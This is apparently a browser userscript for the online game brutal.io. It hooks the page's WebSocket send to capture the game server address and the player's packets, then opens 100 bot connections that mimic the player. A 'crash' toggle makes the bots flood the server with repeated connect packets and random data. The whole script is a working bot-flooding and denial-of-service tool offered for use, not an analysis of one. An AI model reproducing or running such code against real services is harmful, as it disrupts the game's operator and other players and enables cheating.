// ==UserScript==
// @name         brutal WS script thing
// @version      1
// @description  do not connect bots more than once, this will break your tab.
// @author       enderman8686#2873
// @match        *://brutal.io/*
// @grant        none
// ==/UserScript==

(() => {
    "use strict";
    // da variables lol
    let mimicktoggle = false,
        crash = false,
        start = false,
        server;
    let logged = false;
    let spawn = new Uint8Array([3]),
        firstpacket = new Uint8Array([1, 145, 0, 96, 0]);
    const wrapGUI = document.createElement("div"),
          GUI = document.createElement("div");
    let WS;
    let crasher = false;
    let header = []
    // GUI
    document.body.appendChild(wrapGUI);
    wrapGUI.appendChild(GUI)
    setInterval(() => {
        GUI.innerHTML = `<div style='
pointer-events:
none; position:
fixed; top:60px;
left:10px;
font-family: Arial Black;
color: #3beded;
font-size: 20px;
text-shadow: 0px 0px 10px #7dfff2'>
<p>
[T] Connect Bots
<p>
[Q] Crash: ${crasher}
<p>
[R] Mimicking: ${mimicktoggle}
<p style="font-size: 12px;">
enderman8686#2873</p></div>`
    }, Math.floor(1000 / 10));

    // weeb hook (gets data from client, sends it to the bots ws connectiong.)
    window.WebSocket.prototype.WsSend = window.WebSocket.prototype.send;
    window.WebSocket.prototype.send = function(data) {
        //console.log(new Uint8Array(data));
        WS = this;
        logged = data; //assigns client hook to variable. this variable holds the data that will be copied to the bots websockets
        this.WsSend(data); // sends nudes
        server = this.url; // gets server
    }

    document.addEventListener("keydown", (keycode) => {
        if (keycode.keyCode === 84) { // reg
            console.log("New connection(s) made.");
            // start = true;
            for (var i = 0; i < 100; i++) {
                let ws = new WebSocket(server);
                ws.onopen = () => {
                    ws.send(firstpacket); // sending the first packet(connecting packet)
                    ws.send(spawn); // sends spawn packet
                    setInterval(() => {
                        if (mimicktoggle) {
                            ws.send(logged); // clients data sent as bots data.
                        }
                    }, Math.floor(1000 / 10));
                    if (crasher) {
                        for (var i = 0; i < 100; i++) {
                            ws.send(firstpacket);
                            ws.send(spawn);
                            setInterval(() => {
                                ws.send(new Uint8Array([
                                    5,

                                    Math.floor(Math.random() * 200),
                                    Math.floor(Math.random() * 200),
                                    Math.floor(Math.random() * 200),
                                    Math.floor(Math.random() * 200),
                                    Math.floor(Math.random() * 200),
                                    Math.floor(Math.random() * 200),
                                    Math.floor(Math.random() * 200),
                                    Math.floor(Math.random() * 200),
                                    Math.floor(Math.random() * 200),
                                ]));
                            }, Math.floor(1000 / 10));
                        }
                    }
                }
                //if (i < 100) start = false; // works
            }
        }
        if (keycode.keyCode === 81) { // crash
            crasher = !crasher
            setTimeout(() => {
                crasher = false;
            }, 1500);
        }
        if (keycode.keyCode === 82) { // toggle multibox
            mimicktoggle = !mimicktoggle
        }
    });

    // theme
    CanvasRenderingContext2D.prototype._fill = CanvasRenderingContext2D.prototype.fill;
    CanvasRenderingContext2D.prototype.fill = function (args) {
        this.fillStyle = "transparent";
    };
})();
